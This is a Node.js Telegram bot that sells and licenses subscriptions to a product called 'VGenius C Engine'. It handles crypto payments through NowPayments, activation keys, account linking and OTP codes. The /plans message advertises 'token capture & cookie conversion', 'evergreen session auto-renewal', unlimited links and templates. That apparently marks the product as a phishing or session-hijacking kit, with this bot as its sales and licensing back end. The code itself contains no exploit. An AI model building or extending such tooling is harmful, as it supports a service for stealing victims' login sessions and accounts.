require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const db = require('../backend/database/connection');
const config = require('../backend/config/env');
const crypto = require('crypto');
const { createInvoice, getCurrencies, searchCurrency, searchProviderCurrencies, getInvoiceDetails } = require('./payment');

// Singleton bot instance
const bot = new TelegramBot(config.TELEGRAM_BOT_TOKEN, { polling: true });

console.log('[Telegram Bot] Started');

bot.on('polling_error', (err) => {
  console.error('[Telegram Bot] Polling error:', err.code || err.message);
});

bot.on('webhook_error', (err) => {
  console.error('[Telegram Bot] Webhook error:', err.message);
});

// ======================================
// MAINTENANCE MODE SYSTEM
// ======================================
async function isMaintenanceMode() {
  try {
    const [rows] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'maintenance_mode'");
    return rows.length > 0 && rows[0].setting_value === '1';
  } catch (err) {
    console.error('[Bot] Maintenance mode check error:', err.message);
    return false;
  }
}

async function checkMaintenanceMode(chatId) {
  const isMaintenance = await isMaintenanceMode();
  if (isMaintenance) {
    await bot.sendMessage(chatId,
`🚧 *Maintenance Mode Active*\n\n` +
      `The bot is currently under maintenance. All services are temporarily unavailable.\n\n` +
      `Please try again later.\n\n` +
      `⚙️ *Admin: Disable maintenance mode from the admin panel.*`,
      { parse_mode: 'Markdown' }
    );
    return true;
  }
  return false;
}

// ======================================
// USER STATE MANAGEMENT
// ======================================
if (!bot.userStates) bot.userStates = {};

// ======================================
// GLOBAL MESSAGE HANDLER - Maintenance filter
// ======================================
bot.on('message', async (msg) => {
  const chatId = msg.chat?.id;
  if (!chatId) return;

  const isMaintenance = await isMaintenanceMode();
  if (isMaintenance && msg.text && !msg.text.startsWith('/')) {
    return; // Block non-command messages during maintenance
  }

  // Only process non-command messages if user is in an interactive flow
  if (msg.text && !msg.text.startsWith('/')) {
    const state = bot.userStates[chatId];
    if (state && state.step === 'search_coin') {
      await handleCoinSearch(chatId, msg.text.trim());
    }
  }
});

// ======================================
// COMMAND HANDLERS
// ======================================

// /start
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  if (await checkMaintenanceMode(chatId)) return;

  await bot.sendMessage(chatId,
`🔐 *VGenius C Engine Bot*\n\n` +
    `Commands:\n` +
    `/plans - View subscription plans\n` +
    `/buy - Purchase a subscription\n` +
    `/key - Check your activation key status\n` +
    `/status - View your account status\n` +
    `/renew <key> - Renew an existing subscription\n` +
    `/support - Contact support`,
    { parse_mode: 'Markdown' }
  );
});

// /plans
bot.onText(/\/plans/, async (msg) => {
  const chatId = msg.chat.id;
  if (await checkMaintenanceMode(chatId)) return;

  const [settings] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_price_usd'");
  const [durationSettings] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_duration_days'");
  const price = settings.length ? settings[0].setting_value : '50';
  const duration = durationSettings.length ? durationSettings[0].setting_value : '30';

  await bot.sendMessage(chatId,`📋 *Subscription Plans*\n\n` +
    `*Full Access* - $${price} / ${duration} days\n` +
    `• Unlimited links\n` +
    `• All templates\n` +
    `• Token capture & cookie conversion\n` +
    `• Evergreen session auto-renewal\n` +
    `• Telegram notifications\n\n` +
    `Use /buy to purchase.`,
    { parse_mode: 'Markdown' }
  );
});

// /buy - Start coin search flow
bot.onText(/\/buy/, async (msg) => {
  const chatId = msg.chat.id;
  if (await checkMaintenanceMode(chatId)) return;

  await bot.sendMessage(chatId,
    `💰 *Select Payment Coin*\n\n` +
    `NowPayments supports 120+ cryptocurrencies.\n\n` +
    `Please type a coin name or ticker to search:\n` +
    `(e.g., USDT, BTC, ETH, DOGE, SOL, BNB, TRX)\n\n` +
    `*Tip:* Type "USDT" to see all USDT network options.`,
    { parse_mode: 'Markdown' }
  );

  bot.userStates[chatId] = { step: 'search_coin' };
});

// /key
bot.onText(/\/key/, async (msg) => {
  const chatId = msg.chat.id;
  if (await checkMaintenanceMode(chatId)) return;

  await bot.sendMessage(chatId, '🔑 Enter your activation key or payment UID:');

  bot.once('message', async (response) => {
    const code = response.text.trim();
    const [payments] = await db.query('SELECT * FROM payments WHERE payment_uid = ?', [code]);
    if (payments.length) {
      const payment = payments[0];
      const statusEmoji = payment.status === 'confirmed' ? '✅' : payment.status === 'pending' ? '⏳' : '❌';
      await bot.sendMessage(chatId,
        `${statusEmoji} Payment Status: *${payment.status}*\n` +
        `Amount: ${payment.amount_crypto} ${payment.coin}\n` +
        `Date: ${payment.created_at}`,
        { parse_mode: 'Markdown' }
      );
      return;
    }

    const [keys] = await db.query('SELECT * FROM activation_keys WHERE key_code = ?', [code]);
    if (keys.length) {
      const key = keys[0];
        
      await bot.sendMessage(chatId,`🔑 Key: \`${key.key_code}\`\n` +
        `Plan: ${key.plan}\n` +
        `Duration: ${key.duration_days} days\n` +
        `Status: ${key.status}\n` +
        `Used: ${key.times_used}/${key.usage_limit}`,
        { parse_mode: 'Markdown' }
      );
    } else {
      await bot.sendMessage(chatId, '❌ Key or Payment UID not found.');
    }
  });
});

// /status
bot.onText(/\/status/, async (msg) => {
  const chatId = msg.chat.id;
  if (await checkMaintenanceMode(chatId)) return;

  const [users] = await db.query('SELECT * FROM users WHERE telegram_id = ?', [String(chatId)]);

  if (!users.length) {
    await bot.sendMessage(chatId, '❌ No account linked to this Telegram ID.');
    return;
  }

  const user = users[0];
  const statusEmoji = user.subscription_status === 'active' ? '🟢' : user.subscription_status === 'expired' ? '🔴' : '🟡';
  const daysLeft = user.subscription_expiry
    ? Math.max(0, Math.ceil((new Date(user.subscription_expiry) - new Date()) / (1000 * 60 * 60 * 24)))
    : '∞';

  await bot.sendMessage(chatId,
    `${statusEmoji} *Account Status*\n\n` +
    `Plan: ${user.subscription_plan}\n` +
    `Status: ${user.subscription_status}\n` +
    `Days Remaining: ${daysLeft}\n` +
    `Expires: ${user.subscription_expiry || 'Never (Lifetime)'}\n` +
    `Login Key: \`${user.login_key}\``,
    { parse_mode: 'Markdown' }
  );
});

// /renew <key>
bot.onText(/\/renew (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (await checkMaintenanceMode(chatId)) return;

  const key = match[1].trim();
  const [users] = await db.query('SELECT * FROM users WHERE login_key = ?', [key]);

  if (!users.length) {
    await bot.sendMessage(chatId, '❌ No account found with that login key.');
    return;
  }

  const [settings] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_price_usd'");
  const price = settings.length ? parseFloat(settings[0].setting_value) : 50;

  await bot.sendMessage(chatId,
    `🔄 *Renew subscription*\n` +
    `Account: ${key}\n` +
    `Price: $${price} USD\n\n` +
    `💰 *Select Payment Coin*\n\n` +
    `NowPayments supports 120+ cryptocurrencies.\n\n` +
    `Please type a coin name or ticker to search:\n` +
    `(e.g., USDT, BTC, ETH, DOGE, SOL, BNB, TRX)`,
    { parse_mode: 'Markdown' }
  );

  bot.userStates[chatId] = { step: 'search_coin', renewKey: key };
});

// /support
bot.onText(/\/support/, async (msg) => {
  const chatId = msg.chat.id;
  if (await checkMaintenanceMode(chatId)) return;

  await bot.sendMessage(chatId, '📧 For support, use the Feedback form in your user panel or contact the admin.');
});

// /link
bot.onText(/\/link (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (await checkMaintenanceMode(chatId)) return;

  const loginKey = match[1].trim();
  const [users] = await db.query('SELECT * FROM users WHERE login_key = ?', [loginKey]);

  if (!users.length) {
    await bot.sendMessage(chatId, '❌ No account found with that login key.');
    return;
  }

  const user = users[0];
  await db.query('UPDATE users SET telegram_id = ? WHERE id = ?', [String(chatId), user.id]);

  await bot.sendMessage(chatId,
    `✅ *Account Linked*\n\n` +
    `Telegram linked to: \`${user.login_key}\`\n` +
    `Status: ${user.subscription_status}\n` +
    `Plan: ${user.subscription_plan}\n\n` +
    `You will receive OTP codes and notifications here.`,
    { parse_mode: 'Markdown' }
  );
});

// /unlink
bot.onText(/\/unlink/, async (msg) => {
  const chatId = msg.chat.id;
  if (await checkMaintenanceMode(chatId)) return;

  await db.query('UPDATE users SET telegram_id = NULL WHERE telegram_id = ?', [String(chatId)]);
  await bot.sendMessage(chatId, '✅ Telegram account unlinked.');
});

// /otp <key>
bot.onText(/\/otp (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (await checkMaintenanceMode(chatId)) return;

  const loginKey = match[1].trim();
  const [users] = await db.query('SELECT * FROM users WHERE login_key = ?', [loginKey]);

  if (!users.length) {
    await bot.sendMessage(chatId, '❌ No account found with that login key.');
    return;
  }

  const user = users[0];

  if (!user.totp_enabled && (!user.two_fa_method || user.two_fa_method === 'none')) {
    await bot.sendMessage(chatId, 'ℹ️ This account does not have 2FA enabled.');
    return;
  }

  if (user.two_fa_method !== 'telegram') {
    await bot.sendMessage(chatId, 'ℹ️ This account uses TOTP app for 2FA, not Telegram OTP.');
    return;
  }

  if (!user.telegram_id || String(user.telegram_id) !== String(chatId)) {
    await bot.sendMessage(chatId, '❌ Your Telegram ID does not match this account.');
    return;
  }

  const otpCode = crypto.randomInt(100000, 999999).toString();
  const expiresAt = new Date(Date.now() + 5 * 60 * 1000);
  await db.query('DELETE FROM telegram_otp WHERE user_id = ?', [user.id]);

  const otpHash = crypto.createHash('sha256').update(otpCode).digest('hex');
  await db.query(
    'INSERT INTO telegram_otp (user_id, otp_hash, expires_at, used) VALUES (?, ?, ?, 0)',
    [user.id, otpHash, expiresAt]
  );

  await bot.sendMessage(chatId,
    `🔐 *VGenius2FA Code*\n\n` +
    `OTP: \`${otpCode}\`\n` +
    `Expires in 5 minutes.\n\n` +
    `Do not share this code.`,
    { parse_mode: 'Markdown' }
  );
});

// ======================================
// COIN SEARCH & SELECTION
// ======================================

async function handleCoinSearch(chatId, query) {
  try {
    // Search currencies matching the query
    let currencies = await searchCurrency(query);

    if (!currencies || currencies.length === 0) {
      await bot.sendMessage(chatId,
        `❌ No coins found matching "${query}".\n\n` +
        `Try another term.\n\n` +
        `*Popular:* BTC, ETH, USDT, USDC, BNB, DOGE, SOL, XRP, LTC, TRX`,
        { parse_mode: 'Markdown' }
      );
      return;
    }

    const searchLower = query.toLowerCase();

    // Check if this token might have multiple networks
    const isToken = ['usdt', 'usdc', 'busd', 'dai', 'tusd', 'fdusd', 'btc', 'eth'].some(
      t => searchLower.includes(t)
    );
    let providerResults = [];
    if (isToken) {
      providerResults = await searchProviderCurrencies(query);
    }

    // Deduplicate and build display list
    const displayCoins = [];
    const seen = new Set();

    // First add coins that have multiple networks
    for (const coin of currencies) {
      const baseKey = coin.pay_currency.toLowerCase();
      if (seen.has(baseKey)) continue;
      seen.add(baseKey);

      // Find matching providers (networks)
      const matchingProviders = providerResults.filter(p =>
        p.pay_currency && p.pay_currency.startsWith(coin.pay_currency.toLowerCase() + '_')
      );

      if (matchingProviders.length > 0) {
        displayCoins.push({
          baseCoin: coin.pay_currency.toUpperCase(),
          payCurrency: coin.pay_currency.toLowerCase(),
          providers: matchingProviders.map(p => ({
            pay_currency: p.pay_currency,
            payable_with: p.payable_with,
          })),
          hasNetworks: true,
        });
      }
    }

    // Add standalone coins (no network selection needed)
    for (const coin of currencies) {
      const baseKey = coin.pay_currency.toLowerCase();
      if (seen.has(baseKey)) continue;
      seen.add(baseKey);

      displayCoins.push({
        baseCoin: coin.pay_currency.toUpperCase(),
        payCurrency: coin.pay_currency.toLowerCase(),
        providers: [],
        hasNetworks: false,
      });
    }

    if (displayCoins.length === 0) {
      await bot.sendMessage(chatId, `❌ No coins available. Please try again.`);
      return;
    }

    // If only one coin with networks, go straight to network selection
    if (displayCoins.length === 1 && displayCoins[0].hasNetworks) {
      const coin = displayCoins[0];
      await showNetworkSelection(chatId, coin.baseCoin, coin.providers, coin.payCurrency);
      return;
    }

    // If only one coin without networks, go straight to payment
    if (displayCoins.length === 1 && !displayCoins[0].hasNetworks) {
      const coin = displayCoins[0];
      await initiatePayment(chatId, coin.payCurrency);
      return;
    }

    // Show selection buttons for multiple coins
    const keyboard = [];
    for (let i = 0; i < displayCoins.length && i < 12; i += 3) {
      const row = [];
      for (let j = i; j < Math.min(i + 3, displayCoins.length); j++) {
        const coin = displayCoins[j];
        const label = coin.hasNetworks ? `${coin.baseCoin} (networks)` : coin.baseCoin;
        row.push({
          text: label,
          callback_data: `coin_select_${coin.payCurrency}`,
        });
      }
      keyboard.push(row);
    }

    await bot.sendMessage(chatId,
      `🔍 Found ${displayCoins.length} coin(s) matching "${query}".\n\n` +
      `*Select a coin:*`,
      {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard },
      }
    );

    bot.userStates[chatId] = {
      step: 'coin_selected',
      coins: displayCoins,
    };

  } catch (err) {
    console.error('[Bot] Coin search error:', err.message, err.response?.data);
    await bot.sendMessage(chatId,
      `❌ Failed to search coins: ${err.message}\n\nPlease try again.`,
      { parse_mode: 'Markdown' }
    );
  }
}

async function showNetworkSelection(chatId, baseCoin, providers, payCurrency) {
  if (!providers || providers.length === 0) {
    await initiatePayment(chatId, payCurrency || baseCoin.toLowerCase());
    return;
  }

  const keyboard = [];
  for (let i = 0; i < providers.length && i < 9; i += 3) {
    const row = [];
    for (let j = i; j < Math.min(i + 3, providers.length); j++) {
      const provider = providers[j];
      const networkParts = provider.pay_currency.split('_');
      const networkName = networkParts.length > 1 ? networkParts.slice(1).join('_') : networkParts[0];
      row.push({
        text: `${baseCoin} (${networkName})`,
        callback_data: `network_${provider.pay_currency}`,
      });
    }
    keyboard.push(row);
  }

  await bot.sendMessage(chatId,
    `💰 *${baseCoin} - Select Network:*\n\n` +
    `Multiple networks available:\n`,
    {
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: keyboard },
    }
  );

  bot.userStates[chatId] = {
    step: 'network_selected',
    payCurrency: payCurrency || baseCoin.toLowerCase(),
  };
}

// ======================================
// CALLBACK QUERY HANDLER
// ======================================
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  await bot.answerCallbackQuery(query.id);

  // Coin selection from search results
  if (data.startsWith('coin_select_')) {
    const payCurrency = data.replace('coin_select_', '');
    const state = bot.userStates[chatId];

    // Try to fetch providers for this coin
    try {
      const providers = await searchProviderCurrencies(payCurrency);
      if (providers && providers.length > 0) {
        await showNetworkSelection(chatId, payCurrency.toUpperCase(), providers, payCurrency);
      } else {
        await initiatePayment(chatId, payCurrency);
      }
    } catch (err) {
      console.error('[Bot] Provider fetch error:', err.message);
      await initiatePayment(chatId, payCurrency);
    }
    return;
  }

  // Network selection
  if (data.startsWith('network_')) {
    const payCurrency = data.replace('network_', '');
    await initiatePayment(chatId, payCurrency);
    return;
  }
});

// ======================================
// PAYMENT INITIATION
// ======================================
async function initiatePayment(chatId, payCurrency, extra) {
  try {
    const isRenewal = extra && extra.renewKey;
    const [settings] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_price_usd'");
    const price = settings.length ? parseFloat(settings[0].setting_value) : 50;

    const orderId = isRenewal ? `VG_RENEW_${Date.now()}` : `VG_${Date.now()}`;
    const description = isRenewal ? `VGenius Renewal - ${extra.renewKey}` : 'VGenius C Engine Subscription';

    // Create NowPayments invoice
    const invoiceData = await createInvoice(price, payCurrency, orderId, description);

    if (!invoiceData) {
      await bot.sendMessage(chatId, '❌ Payment service returned empty response. Please try again.');
      return;
    }

    const invoiceId = invoiceData.invoice_id || invoiceData.id;
    if (!invoiceId) {
      console.error('[Bot] Invoice missing ID:', JSON.stringify(invoiceData));
      await bot.sendMessage(chatId, '❌ Payment service returned invalid data. Please try again.');
      return;
    }

    // Wait for invoice to initialize, then fetch details
    await new Promise(resolve => setTimeout(resolve, 3000));

    let invoiceDetails;
    try {
      invoiceDetails = await getInvoiceDetails(invoiceId);
    } catch (err) {
      console.error('[Bot] Invoice details error:', err.message);
      await bot.sendMessage(chatId, '❌ Payment details loading... Retry in a moment.');
      return;
    }

    // Retry once if details are incomplete
    if (!invoiceDetails?.pay_address && !invoiceDetails?.wallet_address) {
      console.warn('[Bot] Invoice details incomplete, retrying...');
      await new Promise(resolve => setTimeout(resolve, 3000));
      try {
        invoiceDetails = await getInvoiceDetails(invoiceId);
      } catch (retryErr) {
        console.error('[Bot] Retry failed:', retryErr.message);
        await bot.sendMessage(chatId, '❌ Payment details could not be loaded. Try again.');
        return;
      }
    }

    if (!invoiceDetails) {
      await bot.sendMessage(chatId, '❌ Payment details could not be loaded.');
      return;
    }

    const payAmount = invoiceDetails.pay_amount ?? invoiceDetails.amount ?? '—';
    const payAddress = invoiceDetails.pay_address ?? invoiceDetails.wallet_address ?? '—';
    const orderUid = invoiceDetails.order_id || orderId;
    const expiryMinutes = invoiceDetails.expires_at
      ? Math.max(1, Math.ceil((new Date(invoiceDetails.expires_at) - new Date()) / 60000))
      : 15;

    if (payAmount === '—' || payAddress === '—') {
      console.error('[Bot] Invoice missing payment fields:', JSON.stringify(invoiceDetails));
      await bot.sendMessage(chatId, '❌ Payment details incomplete. Please try again.');
      return;
    }

    // Generate QR code
    const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(payAddress)}`;

    // Build message
    const coinEmoji = getCoinEmoji(payCurrency);
    const networkLabel = getNetworkLabel(payCurrency);

    let msg = `${coinEmoji} *Payment Details*\n\n`;
    msg += `Coin: ${payCurrency.toUpperCase()}\n`;
    if (networkLabel) msg += `Network: ${networkLabel}\n`;
    msg += `Amount: ${payAmount} ${payCurrency.toUpperCase()}\n`;
    msg += `USD: $${price}\n\n`;
    msg += `📍 Wallet Address:\n\`${payAddress}\`\n\n`;
    msg += `🆔 UID: \`${orderUid}\`\n`;
    msg += `⏳ Expires: ~${expiryMinutes} min\n\n`;
    msg += `Send *exactly* ${payAmount} ${payCurrency.toUpperCase()} to the address.\n\n`;
    msg += `Use /key after payment to confirm.`;

    // Send with QR code image
    try {
      await bot.sendPhoto(chatId, qrCodeUrl, msg, { parse_mode: 'Markdown' });
    } catch {
      await bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
    }

    // Save to database
    const userId = isRenewal ? (extra.user?.id || 0) : 0;
    await db.query(
      `INSERT INTO payments (user_id, payment_uid, coin, amount_usd, amount_crypto, wallet_address, invoice_id, ${isRenewal ? 'renew_key, ' : ''}status, expires_at)
       VALUES (?, ?, ?, ?, ?, ?, ?, ${isRenewal ? '?,' : ''}?, DATE_ADD(NOW(), INTERVAL 15 MINUTE))`,
      isRenewal
        ? [userId, orderUid, payCurrency, price, payAmount, payAddress, invoiceId, extra.renewKey, 'pending']
        : [userId, orderUid, payCurrency, price, payAmount, payAddress, invoiceId, 'pending']
    );

    // Start monitoring
    monitorPayment(invoiceId, orderUid, chatId, payCurrency, price, isRenewal, extra?.renewKey, userId);

  } catch (err) {
    console.error('[Bot] Payment creation error:', err.response?.data || err.message);

    let userMsg = '❌ Failed to create payment. Please try again later.';
    if (err.response?.status === 400) {
      const errMsg = (err.response.data?.message || err.response.data?.error || '').toLowerCase();
      if (errMsg.includes('unavailable')) {
        userMsg = `❌ ${payCurrency.toUpperCase()} is unavailable. Choose another coin.`;
      }
    } else if (err.response?.status === 401 || err.response?.status === 403) {
      userMsg = '❌ Payment service auth error. Contact support.';
    } else if (err.response?.status === 429) {
      userMsg = '❌ Payment service busy. Try again soon.';
    }

    await bot.sendMessage(chatId, userMsg);
  }
}

// ======================================
// PAYMENT MONITORING
// ======================================
async function monitorPayment(invoiceId, paymentUid, chatId, coin, price, isRenewal = false, renewKey = null, userId = 0) {
  const startTime = Date.now();
  const maxTime = 24 * 60 * 60 * 1000; // 24 hours
  const interval = 30000; // 30 seconds

  const check = async () => {
    try {
      const resp = await axios.get(`https://api.nowpayments.io/v1/invoice/${invoiceId}`, {
        headers: { 'x-api-key': config.NOWPAYMENTS_API_KEY },
        timeout: 15000,
      });

      const invoice = resp.data;

      if (invoice.payment_status === 'finished' || invoice.payment_status === 'confirmed') {
        // Payment confirmed
        await db.query("UPDATE payments SET status = 'confirmed', confirmed_at = NOW() WHERE payment_uid = ?", [paymentUid]);

        if (isRenewal && renewKey) {
          const [dur] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_duration_days'");
          const duration = dur.length ? parseInt(dur[0].setting_value) : 30;
          await db.query(
            "UPDATE users SET subscription_status = 'active', subscription_plan = 'full', subscription_expiry = DATE_ADD(COALESCE(subscription_expiry, NOW()), INTERVAL ? DAY) WHERE login_key = ?",
            [duration, renewKey]
          );
          await bot.sendMessage(chatId, `✅ Payment confirmed! Subscription extended by ${duration} days.`);
        } else {
          const newCrypto = require('crypto');
          const keyCode = 'VG_' + newCrypto.randomBytes(12).toString('hex').toUpperCase();
          const [dur] = await db.query("SELECT setting_value FROM settings WHERE setting_key = 'subscription_duration_days'");
          const duration = dur.length ? parseInt(dur[0].setting_value) : 30;

          await db.query(
            'INSERT INTO activation_keys (key_code, plan, duration_days, usage_limit, expires_at) VALUES (?, ?, ?, ?, ?)',
            [keyCode, 'full', duration, 1, new Date(Date.now() + 365 * 24 * 60 * 60 * 1000)]
          );

          await bot.sendMessage(chatId,
            `✅ *Payment Confirmed!*\n\n` +
            `Activation Key:\n\`${keyCode}\`\n\n` +
            `Plan: Full Access\nDuration: ${duration} days`,
            { parse_mode: 'Markdown' }
          );
        }

        // Notify admin
        if (config.TELEGRAM_ADMIN_CHAT_ID) {
          await bot.sendMessage(config.TELEGRAM_ADMIN_CHAT_ID,
            `💰 Payment confirmed!\nUID: ${paymentUid}\nCoin: ${coin}\nAmount: $${price}`
          );
        }

        return; // Stop monitoring
      }

      const elapsed = Date.now() - startTime;
      if (elapsed > maxTime) {
        await db.query("UPDATE payments SET status = 'expired' WHERE payment_uid = ?", [paymentUid]);
        return;
      }

      setTimeout(check, interval);
    } catch (err) {
      if (err.response?.status === 404) {
        await db.query("UPDATE payments SET status = 'error' WHERE payment_uid = ?", [paymentUid]);
        return;
      }
      if (err.response?.status === 429) {
        setTimeout(check, interval * 6);
        return;
      }
      if (err.response?.status === 401 || err.response?.status === 403) {
        await db.query("UPDATE payments SET status = 'error' WHERE payment_uid = ?", [paymentUid]);
        return;
      }
      setTimeout(check, interval * 2);
    }
  };

  setTimeout(check, interval);
}

// ======================================
// HELPERS
// ======================================
function getCoinEmoji(coin) {
  const map = {
    BTC: '₿', ETH: 'Ξ', LTC: 'Ł', XRP: '✕', DOGE: 'Ð', DOT: '●',
    SOL: '◎', ADA: '₳', MATIC: '⬡', AVAX: '▲', USDT: '₮', USDC: '$',
    DAI: '◎', BNB: '◆', TRX: 'TRX', LINK: '⬡', UNI: '🅤', BCH: 'BCH',
  };
  return map[(coin || '').toUpperCase()] || '💰';
}

function getNetworkLabel(payCurrency) {
  const parts = payCurrency.split('_');
  if (parts.length < 2) return null;

  const network = parts.slice(1).join('_').toUpperCase();
  const map = {
    ERC20: 'ERC-20 (Ethereum)',
    TRC20: 'TRC-20 (Tron)',
    BEP20: 'BEP-20 (BSC)',
    BEP2: 'BEP-2 (BNB Legacy)',
    TRC21: 'TRC-21 (Tron)',
    OMNI: 'OMNI (Bitcoin)',
    XLM: 'Stellar',
    XRP: 'Ripple Ledger',
    BSC: 'BNB Smart Chain',
    POLYGON: 'Polygon',
    ARBITRUM: 'Arbitrum',
    OPTIMISM: 'Optimism',
    AVALANCHE: 'Avalanche C-Chain',
    FANTOM: 'Fantom',
    SOLANA: 'Solana SPL',
    TON: 'Toncoin',
    EOS: 'EOS',
    NEO: 'NEO',
  };
  return map[network] || network;
}

module.exports = bot;
